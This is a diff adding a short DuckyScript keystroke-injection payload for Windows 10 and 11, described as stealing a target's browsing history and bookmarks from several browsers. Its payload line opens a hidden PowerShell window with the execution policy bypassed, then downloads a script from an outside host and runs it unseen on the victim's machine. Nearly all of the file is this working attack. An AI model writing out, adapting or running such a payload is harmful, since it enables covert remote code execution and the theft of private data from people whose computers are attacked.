@@ -1,0 +1,12 @@
+REM     Title:exflitador de historial de navegacion
+
+REM     Author:mrflippermen
+REM     Description: This payload will grab your targets brosing history and bookmarks from IE, Chrome, Firefox, and Opera GX.
+
+REM     Target: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -ep bypass $dc='';$db='';irm https://jakoby.lol/hgw | iex
+ENTER
+
